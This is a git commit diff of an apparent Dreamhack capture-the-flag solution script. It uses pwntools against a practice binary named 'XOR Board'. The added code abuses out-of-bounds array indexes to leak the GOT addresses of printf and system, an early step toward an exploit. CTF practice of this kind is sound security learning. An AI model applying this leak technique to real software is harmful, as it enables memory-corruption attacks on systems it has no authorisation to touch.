e77f94ecd49ab0a5fc0caaf227f72dee50d0f594
Brian Lee <hibrian827@gmail.com>
2025-03-10 00:42:05 +0900

    solving XOR Board

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,13 +1,27 @@
 from pwn import *
 
 rem = process("./Pwnable/XOR Board/problem/deploy/main")
+# gdb.attach(rem)
 
 elf = ELF("./Pwnable/XOR Board/problem/deploy/main")
 
 arr_offset = elf.symbols['arr']
 win_offset = elf.symbols['win']
-puts_got_offset = elf.got['puts']
+printf_got_offset = elf.got['printf']
+system_got_offset = elf.got['system']
 
-rem.sendlineafter(b"> ", b"2")
-rem.sendlineafter(b"> ", b"-19")
-print(rem.recvline())
+def xor(i, j):
+  rem.sendlineafter(b"> ", b"1")
+  rem.sendlineafter(b"> ", f"{i} {j}".encode())
+
+def print_hex(i):
+  rem.sendlineafter(b"> ", b"2")
+  rem.sendlineafter(b"> ", f"{i}".encode())
+  rem.recvuntil(b"Value: ")
+  return int(rem.recvline().rstrip().decode(), 16)
+
+xor(65, (printf_got_offset-arr_offset) // 8)
+printf_addr = print_hex(65)
+xor(66, (system_got_offset-arr_offset) // 8)
+system_addr = print_hex(66)
+print(hex(system_addr))
